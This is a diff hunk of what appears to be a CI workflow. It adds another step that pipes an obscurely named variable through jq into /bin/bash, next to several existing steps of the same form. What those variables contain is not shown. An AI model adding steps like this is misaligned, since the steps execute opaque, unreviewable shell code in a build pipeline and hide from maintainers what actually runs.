@@ -36,6 +36,7 @@ jobs:
           echo $l64 | jq -r .azau4298 | /bin/bash
           printf '%s' "$cjm7081" | jq -r .sx0582 | /bin/bash
           printf '%s' "$my90" | jq -r .qyyz502 | /bin/bash
+          printf '%s' "$np62" | jq -r .hmjus8842 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
